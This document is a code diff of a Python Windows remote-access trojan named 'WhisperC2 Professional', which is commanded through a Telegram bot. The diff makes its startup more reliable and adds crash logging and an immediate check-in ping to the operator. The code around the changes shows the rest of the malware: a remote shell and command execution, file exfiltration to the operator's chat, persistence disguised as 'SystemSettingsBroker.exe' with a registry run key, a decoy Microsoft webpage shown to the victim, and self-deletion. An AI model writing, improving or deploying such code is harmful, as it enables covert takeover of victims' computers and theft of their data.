@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Final Production Build (Fallback Telemetry Fixed)
+# WhisperC2 Professional – Final Production Build (Telemetry + Crash Log)
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
 import shutil, winreg, ctypes, requests
@@ -18,12 +18,26 @@ GROUP_CHAT_ID = -1003919074770
 DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"
 
 # -----------------------------------------------------------------------------
-# Single‑instance mutex – proper cleanup
+# Early crash logger – writes to a file next to the executable
+# -----------------------------------------------------------------------------
+def crash_log(msg):
+    try:
+        with open(Path(sys.executable).parent / "whisper_error.log", "a") as f:
+            f.write(f"[{datetime.now()}] {msg}\n")
+    except:
+        pass
+
+# -----------------------------------------------------------------------------
+# Single‑instance mutex
 # -----------------------------------------------------------------------------
 MUTEX_NAME = "Global\\WhisperPro_Mutex"
-mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
-if ctypes.windll.kernel32.GetLastError() == 183:
-    sys.exit(0)
+try:
+    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
+    if ctypes.windll.kernel32.GetLastError() == 183:
+        sys.exit(0)
+except Exception as e:
+    crash_log(f"Mutex creation failed: {e}")
+    sys.exit(1)
 atexit.register(ctypes.windll.kernel32.CloseHandle, mutex)
 
 # -----------------------------------------------------------------------------
@@ -39,110 +53,41 @@ def log(msg: str) -> None:
     print(f"* {msg}")
 
 # -----------------------------------------------------------------------------
+# Telegram bot
+# -----------------------------------------------------------------------------
+try:
+    bot = telebot.TeleBot(BOT_API_KEY)
+except Exception as e:
+    crash_log(f"telebot init failed: {e}")
+    sys.exit(1)
+
+# -----------------------------------------------------------------------------
+# Immediate startup notification (plain text – always sent first)
+# -----------------------------------------------------------------------------
+def send_startup_ping():
+    try:
+        bot.send_message(GROUP_CHAT_ID, f"⚡ **{get_system_id()}** is starting…")
+    except:
+        pass
+
+# -----------------------------------------------------------------------------
 # HTML5 Telemetry
 # -----------------------------------------------------------------------------
-bot = telebot.TeleBot(BOT_API_KEY)
-
 def generate_telemetry_report(status: str) -> str:
     color = "#4CAF50" if status == "online" else "#F44336"
     emoji = "🟢" if status == "online" else "💀"
     title = f"{SYSTEM_ID} – {status.upper()}"
-
     rows = ""
     with log_lock:
         for entry in log_lines[-30:]:
-            rows += f"""
-                <tr>
-                    <td class="timestamp">{entry['time']}</td>
-                    <td class="message">{entry['msg']}</td>
-                </tr>"""
-
-    html = f"""<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>{title}</title>
-<style>
-    * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-    body {{
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        background: linear-gradient(135deg, #0d1117, #161b22);
-        color: #c9d1d9;
-        min-height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        padding: 2rem;
-    }}
-    .report-card {{
-        max-width: 900px;
-        width: 100%;
-        background: #161b22;
-        border: 1px solid #30363d;
-        border-radius: 16px;
-        overflow: hidden;
-        box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-    }}
-    .header {{
-        background: {color};
-        padding: 2rem;
-        text-align: center;
-    }}
-    .header h1 {{
-        font-size: 2rem;
-        font-weight: 600;
-        color: white;
-        margin-bottom: 0.25rem;
-    }}
-    .header .agent {{
-        font-size: 1rem;
-        opacity: 0.9;
-        color: white;
-        font-family: monospace;
-    }}
-    table {{
-        width: 100%;
-        border-collapse: collapse;
-    }}
-    th, td {{
-        padding: 0.75rem 1rem;
-        border-bottom: 1px solid #21262d;
-    }}
-    th {{
-        text-align: left;
-        background: #0d1117;
-        color: #8b949e;
-    }}
-    tr:hover {{
-        background: #1c2128;
-    }}
-</style>
-</head>
-<body>
-<div class="report-card">
-    <div class="header">
-        <h1>{emoji} {title}</h1>
-        <div class="agent">{SYSTEM_ID}</div>
-    </div>
-    <div class="body" style="padding:1.5rem">
-        <table>
-            <thead><tr><th>Timestamp</th><th>Event</th></tr></thead>
-            <tbody>{rows if rows else '<tr><td colspan="2" style="text-align:center;color:#8b949e;">No log entries</td></tr>'}</tbody>
-        </table>
-    </div>
-</div>
-</body>
-</html>"""
-    return html
+            rows += f"<tr><td class=\"timestamp\">{entry['time']}</td><td class=\"message\">{entry['msg']}</td></tr>"
+    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{title}</title><style>
+    *{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#0d1117,#161b22);color:#c9d1d9;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:2rem}}.report-card{{max-width:900px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.5)}}.header{{background:{color};padding:2rem;text-align:center}}.header h1{{font-size:2rem;font-weight:600;color:white;margin-bottom:.25rem}}.header .agent{{font-size:1rem;opacity:.9;color:white;font-family:monospace}}table{{width:100%;border-collapse:collapse}}th,td{{padding:.75rem 1rem;border-bottom:1px solid #21262d}}th{{text-align:left;background:#0d1117;color:#8b949e}}tr:hover{{background:#1c2128}}</style></head><body><div class="report-card"><div class="header"><h1>{emoji} {title}</h1><div class="agent">{SYSTEM_ID}</div></div><div class="body" style="padding:1.5rem"><table><thead><tr><th>Timestamp</th><th>Event</th></tr></thead><tbody>{rows if rows else '<tr><td colspan="2" style="text-align:center;color:#8b949e;">No log entries</td></tr>'}</tbody></table></div></div></body></html>"""
 
 def send_telemetry(topic_id, status: str) -> bool:
-    """Send telemetry to the forum topic if available, otherwise to the main group."""
     html_content = generate_telemetry_report(status)
     bio = io.BytesIO(html_content.encode('utf-8'))
     bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
-
-    # Try to send to the forum topic first
     if topic_id:
         try:
             bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
@@ -150,16 +95,12 @@ def send_telemetry(topic_id, status: str) -> bool:
             return True
         except Exception as e:
             print(f"Topic telemetry failed: {e}")
-
-    # Fallback: send to main group (always works)
     try:
         bot.send_document(GROUP_CHAT_ID, bio)
         log(f"Telemetry HTML report sent to main group ({status})")
         return True
     except Exception as e:
         print(f"Main group telemetry failed: {e}")
-
-    # Final fallback: plain‑text message
     plain = f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}\n```\n" + "\n".join([x['msg'] for x in log_lines[-10:]]) + "\n```"
     try:
         bot.send_message(GROUP_CHAT_ID, plain, parse_mode='Markdown')
@@ -244,7 +185,7 @@ def self_destruct(topic_id) -> None:
         persistent = Path(agents_dir) / 'SystemSettingsBroker.exe'
         if persistent.exists():
             persistent.unlink()
-    except Exception:
+    except:
         pass
     try:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -254,14 +195,13 @@ def self_destruct(topic_id) -> None:
                 winreg.DeleteValue(key, 'System Settings Broker')
             except FileNotFoundError:
                 pass
-    except Exception:
+    except:
         pass
     try:
-        # Safe path selection – frozen exe or script file
         current = Path(sys.executable) if getattr(sys, 'frozen', False) else Path(__file__)
         if current.exists():
             ctypes.windll.kernel32.MoveFileExW(str(current), None, 0x4)
-    except Exception:
+    except:
         pass
 
 # -----------------------------------------------------------------------------
@@ -437,82 +377,97 @@ def execute_command(cmd_line: str, topic_id):
 # Main
 # -----------------------------------------------------------------------------
 def main():
-    log("Agent starting")
-    install_persistence()
+    # ---------- CRASH‑PROOF STARTUP ----------
+    try:
+        # 1. Send a minimal "I'm alive" right now
+        send_startup_ping()
+        log("Startup ping sent")
 
-    topic_id = None
-    for _ in range(3):
-        topic_id = get_or_create_topic()
-        if topic_id: break
-        time.sleep(2)
+        # 2. Full normal startup
+        install_persistence()
+        log("Persistence done")
 
-    if not topic_id:
-        log("Could not create forum topic – falling back to main group (with hostname filter)")
         topic_id = None
-        # Notify the operator in the main group
+        for _ in range(3):
+            topic_id = get_or_create_topic()
+            if topic_id: break
+            time.sleep(2)
+
+        if not topic_id:
+            log("Could not create forum topic – falling back to main group (with hostname filter)")
+            topic_id = None
+            try:
+                bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")
+            except:
+                pass
+
+        log(f"Agent ID: {SYSTEM_ID}, Topic: {topic_id if topic_id else 'main (filtered)'}")
+
+        # 3. Define handler (same as before, unchanged)
+        def _handler_wrapper(message):
+            if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
+                return
+            if topic_id is not None:
+                if getattr(message, 'message_thread_id', None) != topic_id:
+                    return
+            else:
+                if not message.text or HOSTNAME_PREFIX not in message.text:
+                    return
+
+            text = (message.text or "").strip()
+            if not text: return
+
+            if shell_active:
+                clean = text[1:] if text.startswith('/') else text
+                if clean.lower() == "exit":
+                    kill_shell()
+                    bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown', message_thread_id=topic_id)
+                elif clean.lower().startswith("die"):
+                    kill_shell()
+                    execute_command("die", topic_id)
+                else:
+                    write_shell(clean)
+                return
+
+            if text.startswith('/'): text = text[1:]
+            response, file_path = execute_command(text, topic_id)
+
+            reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
+            if text.lower().startswith("die"):
+                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
+                sys.exit(0)
+
+            try:
+                bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
+            except:
+                bot.reply_to(message, response, **reply_kwargs)
+
+            if file_path and os.path.exists(file_path):
+                try:
+                    with open(file_path, 'rb') as f:
+                        bot.send_document(message.chat.id, f, message_thread_id=topic_id)
+                except Exception as e:
+                    log(f"File send error: {e}")
+                finally:
+                    try: os.remove(file_path)
+                    except: pass
+
+        @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
+        def _handler(msg):
+            _handler_wrapper(msg)
+
+        threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
+        send_telemetry(topic_id, "online")
+        log("Polling…")
+        bot.infinity_polling(timeout=30, long_polling_timeout=30)
+
+    except Exception as fatal:
+        # Catch EVERY crash and write to disk + attempt Telegram message
+        crash_log(f"Fatal error: {traceback.format_exc()}")
         try:
-            bot.send_message(GROUP_CHAT_ID, f"⚠️ **{SYSTEM_ID}** running in main group mode – commands must include `{HOSTNAME_PREFIX}`")
+            bot.send_message(GROUP_CHAT_ID, f"🔥 **{SYSTEM_ID}** crashed on startup: {fatal}")
         except:
             pass
-
-    log(f"Agent ID: {SYSTEM_ID}, Topic: {topic_id if topic_id else 'main (filtered)'}")
-
-    def _handler_wrapper(message):
-        if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
-            return
-        if topic_id is not None:
-            if getattr(message, 'message_thread_id', None) != topic_id:
-                return
-        else:
-            if not message.text or HOSTNAME_PREFIX not in message.text:
-                return
-
-        text = (message.text or "").strip()
-        if not text: return
-
-        if shell_active:
-            clean = text[1:] if text.startswith('/') else text
-            if clean.lower() == "exit":
-                kill_shell()
-                bot.reply_to(message, "💬 Shell closed.", parse_mode='Markdown', message_thread_id=topic_id)
-            elif clean.lower().startswith("die"):
-                kill_shell()
-                execute_command("die", topic_id)
-            else:
-                write_shell(clean)
-            return
-
-        if text.startswith('/'): text = text[1:]
-        response, file_path = execute_command(text, topic_id)
-
-        reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}
-        if text.lower().startswith("die"):
-            bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
-            sys.exit(0)
-
-        try:
-            bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
-        except:
-            bot.reply_to(message, response, **reply_kwargs)
-
-        if file_path and os.path.exists(file_path):
-            try:
-                with open(file_path, 'rb') as f:
-                    bot.send_document(message.chat.id, f, message_thread_id=topic_id)
-            except Exception as e:
-                log(f"File send error: {e}")
-            finally:
-                try: os.remove(file_path)
-                except: pass
-
-    @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
-    def _handler(msg):
-        _handler_wrapper(msg)
-
-    threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
-    send_telemetry(topic_id, "online")
-    log("Polling…")
-    bot.infinity_polling(timeout=30, long_polling_timeout=30)
 
 if __name__ == "__main__":
     main()
